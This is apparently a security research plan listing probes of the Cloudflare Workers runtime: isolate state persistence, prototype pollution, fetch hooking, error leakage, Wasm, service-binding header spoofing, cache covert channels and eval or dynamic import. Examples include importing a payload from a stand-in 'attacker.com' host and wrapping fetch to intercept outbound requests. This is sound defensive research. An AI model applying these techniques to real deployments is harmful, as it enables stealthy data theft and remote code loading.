# Workerwulf — Extended Probe Specifications

> **Purpose:** New probe categories to deepen understanding of how the Workers runtime actually behaves, beyond the existing W-ENV, W-NET, W-BND, W-ISO, and D-CAP series.
>
> **Convention:** Each probe follows the existing JSON output schema (`test_id`, `track`, `description`, `result`, `severity`, `details`, `comparison`).

---

## Category: W-RUN — Runtime Lifecycle & Isolate Reuse

Workers reuse V8 isolates across invocations for performance. Module-scope and global variables persist between requests hitting the same isolate. These probes document the lifecycle, persistence window, and security implications.

### W-RUN-01: Global Variable Persistence Across Invocations

**Description:** Set a global counter on invocation N, increment on N+1, verify state survives across HTTP requests to the same isolate.

**Method:**
- Declare a module-scope `let invocationCount = 0` and a `let lastRequestId = "none"`
- On each request: increment counter, return previous and current values plus the previous request ID
- Invoke rapidly (~50 requests in sequence) and track whether the counter increments continuously or resets

**Expected output:**
```json
{
  "invocations_observed": 50,
  "counter_persisted": true,
  "max_counter_value": 50,
  "resets_observed": 0,
  "note": "Module-scope state survives across all 50 sequential invocations"
}
```

**Why it matters:** A supply chain attack or prototype pollution that sets a module-scope hook (e.g., patching `fetch`, `Response`, or `JSON.parse` globally) would persist across every subsequent request to that isolate without touching any external storage.

---

### W-RUN-02: Isolate Lifetime Measurement

**Description:** Measure how long a V8 isolate lives before being recycled by Cloudflare's scheduler.

**Method:**
- Store `Date.now()` at module scope on first load (the "born" timestamp)
- On each invocation, return `Date.now() - born` as the isolate age in ms
- Hit the endpoint every ~10s over a sustained period (e.g., 30 minutes via the harness)
- Record when the age resets to 0 (new isolate)

**Expected output:**
```json
{
  "samples": 180,
  "isolate_lifetimes_ms": [142000, 87000, 203000],
  "avg_lifetime_ms": 144000,
  "min_lifetime_ms": 87000,
  "max_lifetime_ms": 203000,
  "note": "Isolates lived 1.5-3.5 minutes under light load"
}
```

**Why it matters:** Defines the persistence window for any global-scope attack. An isolate that lives 5 minutes under steady traffic means a patched global function intercepts every request for 5 minutes before natural recycling clears the infection.

---

### W-RUN-03: Cross-Request Secret Residue

**Description:** Test whether secrets accessed via `env` on request N leave any observable residue on request N+1 that doesn't use that secret.

**Method:**
- Request A: Access `env.SECRET_VALUE`, store nothing explicitly, return a hash of it
- Request B (immediately after): Don't access env at all. Walk all module-scope variables, check `globalThis` for any cached values, inspect any internal caches
- Compare: does request B have any path to the secret's value?

**Expected output:**
```json
{
  "request_a_accessed_secret": true,
  "request_b_secret_residue_found": false,
  "checked_locations": ["globalThis", "module_scope", "WeakRef_registry", "FinalizationRegistry"],
  "note": "No secret residue detected on subsequent invocation"
}
```

**Why it matters:** If the runtime caches resolved secret values in a location accessible to subsequent requests, a later code path (or injected code) could harvest secrets it was never passed.

---

### W-RUN-04: Module-Scope Closure Retention

**Description:** Test whether closures defined at module scope retain references across invocations and whether those references can be enumerated.

**Method:**
- At module scope, define a closure that captures a mutable variable: `let captured = []; const leak = () => captured;`
- On each request, push the request's `cf-ray` header into `captured`
- On a subsequent request, call `leak()` and check if previous requests' ray IDs are present

**Expected output:**
```json
{
  "closure_retains_across_invocations": true,
  "previous_ray_ids_visible": true,
  "ray_ids_accumulated": ["abc123", "def456", "ghi789"],
  "note": "Closures at module scope retain mutable state; previous request data is accessible"
}
```

**Why it matters:** Demonstrates that even without explicitly using globals, closures naturally accumulate cross-request state. Libraries that cache results at module scope (common pattern) may unintentionally create cross-request data leakage.

---

### W-RUN-05: Prototype Pollution Persistence

**Description:** Pollute `Object.prototype` on request N, test whether the pollution persists on request N+1.

**Method:**
- Request A: `Object.prototype.__polluted = "wulf-marker-" + Date.now()`
- Request B: Check if `({}).__polluted` exists and contains the marker
- Clean up: `delete Object.prototype.__polluted` after observation

**Expected output:**
```json
{
  "pollution_persisted": true,
  "marker_from_request_a": "wulf-marker-1779500000000",
  "visible_on_request_b": true,
  "cleanup_successful": true,
  "note": "Prototype pollution survives isolate reuse — any dependency that pollutes Object.prototype affects all subsequent requests"
}
```

**Why it matters:** This is the concrete demonstration of why supply chain attacks in Workers are more impactful than they appear. A single polluted prototype poisons every subsequent request until isolate recycle. Combined with W-RUN-02's lifetime measurement, you get the blast window.

---

### W-RUN-06: Global Function Hooking Persistence

**Description:** Monkey-patch a built-in function (`fetch`, `Response.json`, `JSON.parse`) on request N, verify the hook fires on request N+1.

**Method:**
- Request A with `?action=hook`: Wrap `globalThis.fetch` with a version that appends a header to every outgoing request. Store original.
- Request B with `?action=test`: Make a normal `fetch()` call, check if the injected header is present.
- Request C with `?action=restore`: Restore original fetch.

**Expected output:**
```json
{
  "hook_installed_on_request_a": true,
  "hook_fired_on_request_b": true,
  "injected_header_present": true,
  "header_name": "X-Wulf-Hook",
  "header_value": "intercepted",
  "original_restored_on_request_c": true,
  "note": "Monkey-patched fetch() persists and intercepts all subsequent outbound requests on this isolate"
}
```

**Why it matters:** This is the Living Off the Library equivalent of a rootkit. A compromised dependency could hook `fetch` to exfiltrate all outbound request data, hook `Response` to modify inbound data, or hook `crypto.subtle` to weaken key generation. All without touching storage or network — purely in-memory, invisible to Tail Workers.

---

## Category: W-ERR — Error Handling & Information Disclosure

### W-ERR-01: Error Response Information Leakage

**Description:** Trigger various error conditions and document exactly what information is returned to the HTTP caller vs. what stays internal.

**Method:**
- Trigger each error type and capture the HTTP response (status, headers, body):
  - Unhandled exception (`throw new Error("sensitive data here")`)
  - Unhandled promise rejection
  - `console.error("secret info")` followed by normal response
  - Stack overflow (recursive function)
  - Syntax error in eval (if available)

**Expected output:**
```json
{
  "errors": [
    {
      "type": "unhandled_exception",
      "http_status": 500,
      "body_contains_message": false,
      "body_contains_stack": false,
      "body_preview": "Internal Server Error"
    },
    {
      "type": "stack_overflow",
      "http_status": 500,
      "body_contains_message": false,
      "body_preview": "..."
    }
  ],
  "console_error_visible_to_caller": false
}
```

**Why it matters:** Determines whether an attacker can extract internal state by intentionally triggering errors, and whether defenders can see error details in Tail Workers that callers can't.

---

### W-ERR-02: Cross-Request Error State Leakage

**Description:** Trigger an unhandled error on request N, check if any error state (message, stack, variables) bleeds into request N+1.

**Method:**
- Request A: Throw an error containing a unique marker string. Let it go unhandled.
- Request B: Return a clean response but also walk `globalThis`, check `Error.captureStackTrace` (if present), and look for any residual error state.

**Expected output:**
```json
{
  "error_marker": "WULF-ERR-MARKER-12345",
  "marker_found_on_subsequent_request": false,
  "error_state_locations_checked": ["globalThis", "Error.stackTraceLimit", "last_error_cache"],
  "note": "No cross-request error state leakage detected"
}
```

---

### W-ERR-03: OOM Behavior and Observability

**Description:** Approach and hit the memory limit. Document what happens to the isolate and what the caller/Tail Worker sees.

**Method:**
- Allocate progressively larger arrays in a loop
- Record allocation sizes until failure
- Capture the error type and message
- On the *next* request, check if the isolate was recycled (via W-RUN-01 counter reset)

**Expected output:**
```json
{
  "allocations_before_oom": 47,
  "last_successful_allocation_mb": 94,
  "oom_error_type": "RangeError",
  "oom_error_message": "...",
  "isolate_recycled_after_oom": true,
  "http_response_to_caller": "Internal Server Error",
  "memory_limit_observed_mb": 128
}
```

**Why it matters:** Documents the memory ceiling an attacker has to work with and whether OOM kills the isolate (resetting any persisted global state from W-RUN probes).

---

### W-ERR-04: CPU Time Limit Behavior

**Description:** Hit the CPU time limit and document the termination behavior.

**Method:**
- Run a tight compute loop (e.g., SHA-256 hashing in a loop)
- Measure how many iterations complete before termination
- Capture the error type and what the caller receives
- Check isolate recycle on next request

**Expected output:**
```json
{
  "iterations_before_kill": 248000,
  "elapsed_wall_ms": 31,
  "error_type": "Error",
  "error_message": "Worker exceeded CPU time limit",
  "isolate_recycled": true,
  "http_status_to_caller": 500
}
```

---

## Category: W-CRY — Cryptographic Surface Area

### W-CRY-01: Web Crypto Algorithm Support Matrix

**Description:** Enumerate every algorithm supported by `crypto.subtle` in the Workers runtime.

**Method:**
- Attempt `generateKey`, `encrypt`, `decrypt`, `sign`, `verify`, `digest`, `deriveBits`, `deriveKey`, `wrapKey`, `unwrapKey` for every standard Web Crypto algorithm
- Record supported/unsupported for each combination

**Expected output:**
```json
{
  "algorithms": {
    "AES-GCM": { "generateKey": true, "encrypt": true, "decrypt": true },
    "RSA-OAEP": { "generateKey": true, "encrypt": true, "decrypt": true },
    "ECDSA": { "generateKey": true, "sign": true, "verify": true },
    "Ed25519": { "generateKey": true, "sign": true, "verify": true },
    "HMAC": { "generateKey": true, "sign": true, "verify": true },
    "PBKDF2": { "deriveBits": true, "deriveKey": true },
    "HKDF": { "deriveBits": true, "deriveKey": true }
  },
  "total_supported": 24,
  "total_tested": 40
}
```

**Why it matters:** Full reference for defenders (what crypto is available for key management, token signing, etc.) and attackers (what brute-force or key generation capabilities exist post-compromise).

---

### W-CRY-02: Key Export and Extractability

**Description:** Test whether generated private keys can be exported from the runtime.

**Method:**
- Generate key pairs with `extractable: true` and `extractable: false`
- Attempt `exportKey("pkcs8", privateKey)` and `exportKey("jwk", privateKey)` for both
- Test whether non-extractable keys can be worked around via any method

**Expected output:**
```json
{
  "extractable_true": {
    "pkcs8_export": true,
    "jwk_export": true
  },
  "extractable_false": {
    "pkcs8_export": false,
    "jwk_export": false,
    "error": "key is not extractable"
  },
  "bypass_attempted": ["structured_clone", "JSON.stringify", "postMessage"],
  "bypass_succeeded": false
}
```

---

### W-CRY-03: CSPRNG Entropy Quality

**Description:** Assess `crypto.getRandomValues()` output quality.

**Method:**
- Generate 1MB of random data via `crypto.getRandomValues()`
- Run basic statistical tests (chi-square, runs test, byte frequency distribution)
- Compare entropy per byte to theoretical maximum (8.0 bits)
- Test whether output is consistent across rapid sequential calls (no obvious patterns)

**Expected output:**
```json
{
  "sample_size_bytes": 1048576,
  "entropy_per_byte": 7.9998,
  "chi_square_p_value": 0.47,
  "runs_test_p_value": 0.52,
  "byte_frequency_max_deviation": 0.003,
  "assessment": "passes basic randomness tests"
}
```

---

## Category: W-OBJ — Undocumented Global Object Inspection

### W-OBJ-01: `Cloudflare` Global Object Deep Walk

**Description:** Recursively enumerate all properties, methods, and nested objects on the `Cloudflare` global.

**Method:**
- `Object.getOwnPropertyNames(Cloudflare)` and `Object.getOwnPropertySymbols(Cloudflare)`
- For each property, record type, value (if primitive), constructor name, and enumerate sub-properties
- Walk prototype chain

**Expected output:**
```json
{
  "own_properties": ["compatibilityFlags", "..."],
  "prototype_chain": ["Object"],
  "nested_objects": {},
  "methods": [],
  "total_properties": 5,
  "note": "Documents any build info, colo metadata, or feature flags exposed via the Cloudflare global"
}
```

**Why it matters:** This object was found in W-ENV-01 but never deeply probed. It may expose compatibility flags, edge colo info, or feature gates that reveal deployment details useful for fingerprinting.

---

### W-OBJ-02: `process` Object Deep Walk

**Description:** Enumerate everything on the `process` global (Node.js compat layer).

**Method:**
- Walk `process.env`, `process.versions`, `process.arch`, `process.platform`, `process.argv`
- Check `process.binding()`, `process.dlopen()` (likely blocked but worth documenting)
- Compare to Dynamic Worker where `process` is stripped (D-CAP-01)

**Expected output:**
```json
{
  "process.env": {},
  "process.versions": { "node": "...", "v8": "...", "..." : "..." },
  "process.arch": "x64",
  "process.platform": "linux",
  "process.argv": [],
  "process.binding_available": false,
  "process.dlopen_available": false,
  "total_properties": 15
}
```

**Why it matters:** `process.versions.v8` would reveal the exact V8 version, which maps to known CVEs. `process.env` being empty vs. containing runtime variables is a meaningful distinction.

---

### W-OBJ-03: `Buffer.allocUnsafe()` Uninitialized Memory Probe

**Description:** Test whether `Buffer.allocUnsafe()` returns uninitialized memory that might contain data from previous allocations.

**Method:**
- First, write a known pattern to a regular `Buffer.alloc(4096)` to fill the heap
- Then call `Buffer.allocUnsafe(4096)` repeatedly (100 iterations)
- Check each allocation for non-zero bytes
- Look for recognizable patterns (strings, pointers, structured data)

**Expected output:**
```json
{
  "iterations": 100,
  "allocations_with_nonzero_bytes": 0,
  "max_nonzero_byte_count": 0,
  "recognizable_patterns_found": false,
  "note": "allocUnsafe appears to return zeroed memory in Workers runtime (differs from Node.js behavior)"
}
```

**Why it matters:** In Node.js, `Buffer.allocUnsafe()` is a known information disclosure vector. If Workers behaves differently (zeroes memory), that's a positive security finding worth documenting. If it *doesn't*, that's a real issue.

---

### W-OBJ-04: `navigator` Object Fingerprinting Data

**Description:** Enumerate everything on the `navigator` global for fingerprinting-relevant data.

**Method:**
- Walk all properties: `userAgent`, `platform`, `language`, `hardwareConcurrency`, `deviceMemory`, etc.
- Document which browser-standard navigator properties exist vs are missing

**Expected output:**
```json
{
  "userAgent": "Cloudflare-Workers",
  "platform": "...",
  "language": "...",
  "hardwareConcurrency": 1,
  "properties_present": ["userAgent", "..."],
  "properties_missing": ["geolocation", "bluetooth", "..."],
  "total": 8
}
```

---

## Category: W-WASM — WebAssembly Security Surface

### W-WASM-01: Runtime Wasm Compilation

**Description:** Test whether Wasm modules can be compiled at runtime from raw bytes.

**Method:**
- Construct a minimal Wasm module as a `Uint8Array` (just exports a function that returns 42)
- `WebAssembly.compile(bytes)` and then `WebAssembly.instantiate()`
- If successful, test with a more complex module

**Expected output:**
```json
{
  "compile_from_bytes": true,
  "instantiate_from_bytes": true,
  "streaming_compile": true,
  "returned_value": 42,
  "note": "Arbitrary Wasm can be compiled at runtime — enables obfuscated payload execution"
}
```

**Why it matters:** If Wasm can be compiled from raw bytes at runtime, an attacker can ship obfuscated payloads that bypass any source-level static analysis. The Wasm binary could contain the actual malicious logic while the JS source looks clean.

---

### W-WASM-02: Wasm Timer Precision

**Description:** Test whether the clock clamping observed in W-NET-06 also applies inside Wasm execution.

**Method:**
- Build a Wasm module that imports `performance.now` (or `Date.now`) and calls it in a tight loop
- Compare timing resolution to the JS-side measurements from W-NET-06
- Also test: does a Wasm `memory.grow` + tight loop provide any timing side channel?

**Expected output:**
```json
{
  "wasm_performance_now_unique_values": 1,
  "wasm_date_now_unique_values": 1,
  "js_performance_now_unique_values": 1,
  "clock_clamping_applies_to_wasm": true,
  "memory_grow_timing_variance": false,
  "note": "Same clock clamping in Wasm as JS — no timer bypass via Wasm"
}
```

---

### W-WASM-03: Wasm Memory Boundary Integrity

**Description:** Verify Wasm linear memory stays within its allocated bounds.

**Method:**
- Allocate a Wasm module with 1 page (64KB) of memory
- Attempt to read/write beyond the linear memory boundary via both Wasm instructions and JS `ArrayBuffer` views
- Test `memory.grow` to maximum and observe limits

**Expected output:**
```json
{
  "initial_pages": 1,
  "max_grow_pages": 256,
  "out_of_bounds_read_result": "trap",
  "out_of_bounds_write_result": "trap",
  "js_view_bounds_enforced": true,
  "max_memory_mb": 16
}
```

---

## Category: W-SVC — Service Binding Behavior

### W-SVC-01: Service Binding Request Identity

**Description:** When Worker A calls Worker B via a service binding, what does Worker B see as the request origin?

**Method:**
- Deploy Worker B (prey-worker) with logging of all incoming request headers
- Worker A (a new minimal service-binding test Worker) calls B via the binding
- Compare headers from a service binding call vs. an external HTTP call

**Expected output:**
```json
{
  "external_request_headers": {
    "cf-connecting-ip": "203.0.113.1",
    "cf-ray": "abc123",
    "x-forwarded-for": "203.0.113.1"
  },
  "service_binding_headers": {
    "cf-connecting-ip": "present_or_absent?",
    "cf-ray": "different_ray?",
    "x-forwarded-for": "present_or_absent?",
    "custom_headers_from_caller": "preserved_or_stripped?"
  },
  "can_distinguish_internal_vs_external": true,
  "caller_identity_exposed": false
}
```

**Why it matters:** If a Worker can't distinguish a service binding call from an external request, it might apply authentication to external requests but have it bypassed via an internal service binding from a compromised sibling Worker.

---

### W-SVC-02: Service Binding Header Spoofing

**Description:** Test whether a calling Worker can spoof trusted headers (CF-Connecting-IP, CF-Ray, etc.) through a service binding.

**Method:**
- Worker A sets `CF-Connecting-IP: 6.6.6.6` and other Cloudflare headers on the fetch to Worker B
- Worker B logs what it receives
- Compare: did the spoofed headers arrive, or did Cloudflare strip/overwrite them?

**Expected output:**
```json
{
  "spoofed_headers_sent": ["CF-Connecting-IP", "CF-IPCountry", "CF-Ray"],
  "headers_received_by_target": {
    "CF-Connecting-IP": "6.6.6.6 or overwritten?",
    "CF-IPCountry": "XX or overwritten?"
  },
  "spoofing_possible": false,
  "note": "..."
}
```

---

### W-SVC-03: Recursive Self-Binding

**Description:** What happens when a Worker calls itself via a service binding?

**Method:**
- Configure prey-worker with a service binding to itself
- Invoke with a `?depth=N` parameter that decrements and re-fetches
- Measure how deep it goes before hitting a limit

**Expected output:**
```json
{
  "max_depth_reached": 16,
  "termination_reason": "subrequest limit",
  "error_message": "Too many subrequests",
  "subrequest_limit": 50,
  "note": "Cloudflare enforces a per-request subrequest limit that prevents infinite recursion"
}
```

---

### W-SVC-04: Service Binding Chain Identity Propagation

**Description:** In a chain A→B→C via service bindings, does request context (IP, Ray ID, cf object) propagate, mutate, or get stripped?

**Method:**
- Three Workers: A calls B calls C, each logging the full `request.cf` object and headers
- Compare the `cf` object at each hop

**Expected output:**
```json
{
  "hop_a_cf_colo": "ATL",
  "hop_b_cf_colo": "ATL",
  "hop_c_cf_colo": "ATL",
  "cf_object_mutated_between_hops": false,
  "original_client_ip_visible_at_hop_c": true,
  "ray_id_changes_per_hop": true
}
```

---

## Category: W-CACHE — Cache API as Covert Channel

### W-CACHE-01: Cross-Invocation Cache Persistence

**Description:** Write a cache entry on request N, read it on request N+1.

**Method:**
- Request A: `caches.default.put(new Request("https://wulf/signal"), new Response("marker-123"))`
- Request B: `caches.default.match(new Request("https://wulf/signal"))`
- Vary timing between requests (immediate, 10s, 60s, 5min)

**Expected output:**
```json
{
  "cache_write_success": true,
  "read_after_0s": true,
  "read_after_10s": true,
  "read_after_60s": true,
  "read_after_300s": true,
  "max_ttl_observed_s": 300,
  "note": "Cache entries persist across invocations and isolate recycles"
}
```

**Why it matters:** Unlike global-scope persistence (W-RUN series), cache persists across isolate recycles and is shared at the colo level. This makes it a more durable covert signaling channel than in-memory state.

---

### W-CACHE-02: Cross-Worker Cache Visibility

**Description:** Test whether two different Worker scripts on the same zone can see each other's cache entries.

**Method:**
- prey-worker writes a cache entry with a known key
- A second Worker (or the dynamic-parent) attempts to read the same cache key
- Test with `caches.default` and named caches (`caches.open("shared")`)

**Expected output:**
```json
{
  "default_cache_shared_across_workers": false,
  "named_cache_shared_across_workers": false,
  "same_worker_different_routes_shared": true,
  "note": "Cache is scoped to the Worker script, not the zone"
}
```

---

### W-CACHE-03: Cache Key Steganography

**Description:** Test whether arbitrary data can be encoded in cache keys and whether there are size/character restrictions.

**Method:**
- Write cache entries with keys containing: Base64 data, binary-looking strings, very long URLs (1KB, 10KB, 100KB path), special characters, null bytes
- Read each back and verify integrity

**Expected output:**
```json
{
  "max_key_length_bytes": 8192,
  "base64_in_key": true,
  "special_chars_in_key": true,
  "null_bytes_in_key": false,
  "max_value_size_bytes": 524288000,
  "note": "Cache keys are URLs and follow URL rules; values up to 500MB"
}
```

---

## Category: W-DYN — Dynamic Code Execution

### W-DYN-01: `eval()` Availability

**Description:** Test whether `eval()` executes arbitrary code in a standard Worker.

**Method:**
- `eval("1 + 1")` — basic expression
- `eval("globalThis.evalMarker = 'pwned'")` — side-effecting eval
- Check if `evalMarker` persists on the next request (combines with W-RUN-01)

**Expected output:**
```json
{
  "eval_available": true,
  "eval_basic_expression": 2,
  "eval_side_effect": true,
  "eval_marker_persists": true,
  "note": "eval() works and side effects persist across invocations via isolate reuse"
}
```

**Why it matters:** If `eval()` works, any code path that passes unsanitized input to `eval()` (e.g., a JSON config parser, a template engine) becomes a full code execution vector.

---

### W-DYN-02: `new Function()` Constructor

**Description:** Test whether the `Function` constructor can create new functions from strings at runtime.

**Method:**
- `new Function("return 42")()`
- `new Function("x", "return x * 2")(21)`
- `new Function("return globalThis")()`

**Expected output:**
```json
{
  "function_constructor_available": true,
  "basic_return": 42,
  "with_args": 42,
  "can_access_global_scope": true,
  "note": "Function constructor works — equivalent to eval for code generation"
}
```

---

### W-DYN-03: Dynamic `import()` at Runtime

**Description:** Test whether `import()` can load modules dynamically at runtime.

**Method:**
- `import("data:text/javascript,export default 42")`
- `import("https://attacker.com/payload.js")` (against callback server)
- `import("./nonexistent-module.js")`

**Expected output:**
```json
{
  "data_uri_import": { "success": false, "error": "..." },
  "remote_url_import": { "success": false, "error": "..." },
  "relative_import": { "success": false, "error": "..." },
  "note": "Dynamic import() is restricted to bundled modules — no runtime code loading from URLs"
}
```

**Why it matters:** If dynamic `import()` from URLs works, an attacker can load remote payloads without them being present in the deployed bundle. If it doesn't (likely), that's a positive finding confirming the attack surface is limited to code in the deployment bundle.

---

### W-DYN-04: `eval()` in Dynamic Workers

**Description:** Repeat W-DYN-01 inside a Dynamic Worker child to check if the sandbox restricts `eval()` differently.

**Method:**
- The child code template includes an `eval()` test
- Compare availability and behavior to the parent Worker

**Expected output:**
```json
{
  "parent_eval_available": true,
  "child_eval_available": true,
  "child_eval_can_modify_globals": true,
  "note": "eval() is available in both contexts — Dynamic Workers do not restrict it"
}
```

**Why it matters:** If Dynamic Workers are intended to run untrusted code but `eval()` is available inside them, the untrusted code can generate and execute *additional* code at runtime, potentially bypassing any source-level analysis the parent might do on the child source before loading it.

---

## Implementation Notes

### Probe Naming Convention

| Prefix | Category |
|--------|----------|
| W-RUN- | Runtime lifecycle, isolate reuse, state persistence |
| W-ERR- | Error handling, information disclosure |
| W-CRY- | Cryptographic API surface |
| W-OBJ- | Undocumented/underexplored global objects |
| W-WASM- | WebAssembly security surface |
| W-SVC- | Service binding behavior |
| W-CACHE- | Cache API covert channel potential |
| W-DYN- | Dynamic code execution (eval, Function, import) |

### Deployment Requirements

- **W-SVC probes** require a second Worker with a service binding to prey-worker (add to Terraform)
- **W-SVC-04** requires a third Worker for the chain test
- **W-CACHE-02** requires testing from two different Worker scripts
- **W-WASM probes** require a minimal Wasm binary — can be built inline as a `Uint8Array` or compiled from a `.wat` file
- **W-RUN probes** require the harness to make sequential requests with short delays and track state across them
- All other probes can run within the existing prey-worker deployment

### Harness Changes

The W-RUN series requires the harness to:
1. Make multiple sequential requests to the same probe endpoint
2. Track responses across invocations (not just single request/response)
3. Support a `--sequential N` flag for multi-invocation probes
4. Potentially pin to a specific colo via Cloudflare's `cf-colo` routing to ensure isolate reuse

### Priority Order

1. **W-OBJ-01, W-OBJ-02, W-OBJ-03** — Quick wins, extend existing env enumeration
2. **W-DYN-01, W-DYN-02, W-DYN-03** — Critical for attack surface documentation
3. **W-RUN-01 through W-RUN-06** — The persistence/hooking story is the most novel contribution
4. **W-ERR-01 through W-ERR-04** — Important for both attacker and defender perspective
5. **W-CACHE-01, W-CACHE-02** — Covert channel documentation
6. **W-CRY-01, W-CRY-02, W-CRY-03** — Completeness
7. **W-WASM-01, W-WASM-02, W-WASM-03** — Completeness
8. **W-SVC-01 through W-SVC-04** — Requires additional infra, do last
